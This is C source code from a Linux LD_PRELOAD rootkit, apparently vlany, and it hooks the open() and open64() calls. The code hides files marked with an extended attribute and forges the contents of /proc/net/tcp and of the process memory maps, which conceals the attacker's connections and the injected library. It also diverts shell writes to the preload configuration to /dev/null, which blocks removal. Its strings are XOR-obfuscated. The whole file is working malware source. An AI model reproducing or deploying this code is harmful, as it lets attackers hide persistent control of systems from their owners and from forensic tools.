int open(const char *pathname, int flags, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] open() called\n");
    #endif

    HOOK(old_open, COPEN);

    if(owned() || !pathname) return old_open(pathname, flags, mode);

    char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
    if(hidden_xattr(pathname) && strstr(pathname, ld_preload_etc))
    {
        CLEAN(ld_preload_etc);
        char *p = procname_self();
        if((strstr(p, "sh") || strstr(p, "busybox")) && (flags == (64|1|512))) return old_open("/dev/null", flags, mode);
    }
    CLEAN(ld_preload_etc);

    char *proc_net_tcp = strdup(PROC_NET_TCP), *proc_net_tcp6 = strdup(PROC_NET_TCP6);
    xor(proc_net_tcp); xor(proc_net_tcp6);
    if(!strcmp(pathname, proc_net_tcp) ||
       !strcmp(pathname, proc_net_tcp6))
    { CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6); return fileno(forge_proc_net_tcp(pathname)); }
    CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6);

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return fileno(forge_mem_maps(pathname));
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_mem_smaps(pathname));

    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numa_maps(pathname));

    // if cwd is /proc/ or /proc/id
    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return fileno(forge_mem_maps(pathname));
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_mem_smaps(pathname));

            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numa_maps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME))
        {
            if(!fnmatch("maps", pathname, FNM_PATHNAME)) return fileno(forge_mem_maps(pathname));
            if(!fnmatch("smaps", pathname, FNM_PATHNAME)) return fileno(forge_mem_smaps(pathname));

            if(!fnmatch("numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numa_maps(pathname));
        }
    }

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_open(pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] open64() called\n");
    #endif

    HOOK(old_open64, COPEN64);

    if(owned() || !pathname) return old_open64(pathname, flags, mode);

    char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
    if(hidden_xattr(pathname) && strstr(pathname, ld_preload_etc))
    {
        CLEAN(ld_preload_etc);
        char *p = procname_self();
        if((strstr(p, "sh") || strstr(p, "busybox")) && (flags == (64|1|512))) return old_open64("/dev/null", flags, mode);
    }
    CLEAN(ld_preload_etc);

    char *proc_net_tcp = strdup(PROC_NET_TCP), *proc_net_tcp6 = strdup(PROC_NET_TCP6);
    xor(proc_net_tcp); xor(proc_net_tcp6);
    if(!strcmp(pathname, proc_net_tcp) ||
        !strcmp(pathname, proc_net_tcp6))
        { CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6); return fileno(forge_proc_net_tcp(pathname)); }
    CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6);

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return fileno(forge_mem_maps(pathname));
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_mem_smaps(pathname));

    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numa_maps(pathname));

    // if cwd is /proc/ or /proc/id
    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return fileno(forge_mem_maps(pathname));
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_mem_smaps(pathname));

            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numa_maps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME))
        {
            if(!fnmatch("maps", pathname, FNM_PATHNAME)) return fileno(forge_mem_maps(pathname));
            if(!fnmatch("smaps", pathname, FNM_PATHNAME)) return fileno(forge_mem_smaps(pathname));

            if(!fnmatch("numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numa_maps(pathname));
        }
    }

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_open64(pathname, flags, mode);
}
